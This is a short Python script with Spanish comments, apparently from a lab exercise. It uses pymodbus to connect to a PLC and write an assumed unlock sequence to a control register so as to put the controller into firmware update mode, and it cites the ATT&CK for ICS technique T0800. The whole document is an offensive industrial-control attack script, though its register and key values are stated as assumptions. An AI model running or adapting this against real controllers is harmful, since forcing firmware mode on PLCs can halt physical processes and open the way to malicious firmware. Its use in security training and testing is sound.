from pymodbus.client import ModbusTcpClient

# Configuración del objetivo
PLC_IP = "192.168.70.129"

# En nuestro laboratorio, asumimos que el fabricante usa el registro 1000
# para el control de firmware.
FIRMWARE_CONTROL_REG = 1000 

# La "Magic Key" que el fabricante usa para activar el modo Update.
# Por ejemplo, 0xAA55 (Unlock) y 0x00FF (Enter Update Mode)
MAGIC_SEQUENCE = [0xAA55, 0x00FF] 

def activate_firmware_mode():
    client = ModbusTcpClient(PLC_IP)
    if client.connect():
        print(f"[*] Conectado al PLC {PLC_IP}...")
        print(f"[!] Inyectando secuencia mágica (T0800) en el registro {FIRMWARE_CONTROL_REG}...")
        
        # Utilizamos Function Code 16 (Write Multiple Registers) para enviar la clave
        result = client.write_registers(FIRMWARE_CONTROL_REG, MAGIC_SEQUENCE)
        
        if not result.isError():
            print("[+] ¡Secuencia inyectada con éxito! El PLC ha recibido el comando de Firmware Update.")
        else:
            print("[-] El PLC rechazó la escritura (Posible medida de seguridad).")
        client.close()
    else:
        print("[-] No se pudo conectar al PLC.")

if __name__ == "__main__":
    activate_firmware_mode()
